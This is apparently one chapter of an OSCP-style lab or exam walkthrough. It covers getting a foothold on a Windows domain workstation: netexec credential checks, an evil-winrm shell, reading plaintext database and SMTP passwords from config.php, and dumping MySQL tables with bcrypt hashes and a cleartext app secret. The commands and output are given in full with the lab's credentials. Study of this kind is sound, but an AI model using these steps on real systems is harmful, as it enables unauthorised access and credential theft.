# 02 — Foothold: WinRM as `oscp.exam\andrew`

The exam gives one credential for one machine. On this set it is a **domain user**, and that user is
in `Remote Management Users` on WS01 — so SMB gets you a `[+]` and nothing else, while WinRM gets you
a shell.

## 2.1 Validate the credential

```bash
nxc smb 192.168.91.206 -u 'landon' -p 'BussOff@theRiv3r'
```

```
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [-] oscp.exam\landon:BussOff@theRiv3r STATUS_LOGON_FAILURE
```

```bash
nxc smb 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
```

```
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [+] oscp.exam\andrew:BussOff@theRiv3r
```

`[+]` without `(Pwn3d!)` = valid account, **not** local admin. That is the expected shape for a
foothold account on a workstation.

## 2.2 WinRM

```bash
nxc winrm 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
```

```
WINRM  192.168.91.206  5985  WS01  [*] Windows 11 Build 22000 (name:WS01) (domain:oscp.exam)
WINRM  192.168.91.206  5985  WS01  [+] oscp.exam\andrew:BussOff@theRiv3r (Pwn3d!)
```

For WinRM, netexec's `(Pwn3d!)` means *this account can execute code here*, not "domain admin". A
plain `Remote Management Users` membership is enough.

```bash
evil-winrm -i 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
```

```
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\andrew\Documents>
```

You are now a normal domain user on a domain-joined workstation. First question is always
`whoami /priv` / `whoami /groups`; on this box the interesting find comes later from the filesystem,
not from the token.

## 2.3 `config.php` — the whole database in one file

```powershell
cat config.php
```

```php
<?php
/*
 * OffSec SOC - Configuration File
 * Web Hosting & Domain Services
 */

// Database Configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'offsec_db');
define('DB_USER', 'offsec_user');
define('DB_PASS', 'OffSec_2024');

// User Configuration
define('SMTP_HOST', 'smtp.offsec.local');
define('SMTP_USER', 'notifications@offsec.local');
define('SMTP_PASS', 'b8c4f1e9a7d3');
define('SMTP_PORT', '587');
define('SMTP_SECURE', 'false');
define('SMTP_FROM', 'notifications@offsec.local');
```

Two lessons in one file:

1. Web-app source on disk is faster than attacking the web app. One `cat` replaces a session of
   fuzzing.
2. The DB account is `offsec_user` / `OffSec_2024` — local to the box, reachable from the shell.

## 2.4 MySQL — a lot of noise, one useful table

Connect with the client already on the host:

```powershell
mysql -u offsec_user -p'OffSec_2024'
```

```
mysql: [Warning] Using a password on the command line interface can be insecure.
```

```sql
use offsec_db;
show tables;
```

```
Database changed
+---------------------+
| Tables_in_offsec_db |
+---------------------+
| users               |
| user_settings       |
+---------------------+
2 rows in set (0.001 sec)
```

### `users` — the dead end

```sql
select * from users;
```

```
+----+---------------------+--------------------------------------------------------------+------------+
| id | email               | password                                                     | first_name |
+----+---------------------+--------------------------------------------------------------+------------+
|  1 | a.bailey@oscp.exam  | $2y$10$...                                                   | Alan       |
| .. | ...                 | $2y$10$...                                                   | ...        |
+----+---------------------+--------------------------------------------------------------+------------+
```

Dozens of `$2y$10$` bcrypt rows. This is a **time sink** on an exam: bcrypt at cost 10 is slow
enough that cracking a table this size before the clock runs out is not a plan. The table is a
time sink: note it for the report and move on.

### `user_settings` — the one plaintext row

```sql
select * from user_settings;
```

```
+----+---------+---------------------------+------------+---------------------+----------------------+-----------+
| id | user_id | password                  | encryption | from_email          | from_name            | is_active |
+----+---------+---------------------------+------------+---------------------+----------------------+-----------+
|  1 |     567 | CredentialPowerRights133  | tls        | noreply@oscp.exam   | Offsec Notifications |         1 |
+----+---------+---------------------------+------------+---------------------+----------------------+-----------+
```

An application secret in cleartext (SMTP/app password). Worth noting — it is the kind of value
that gets reused on the next box — but it is **not** the local Administrator password, and it does
not open the DC by itself.

## 2.5 What this chapter deliberately does not do

- No web-app exploitation. The source was already readable; attacking the login would have cost time
  for the same information.
- No hash cracking. The bcrypt table is noted as loot, not as a path.

---

**Next:** [`03-privilege-escalation.md`](03-privilege-escalation.md)
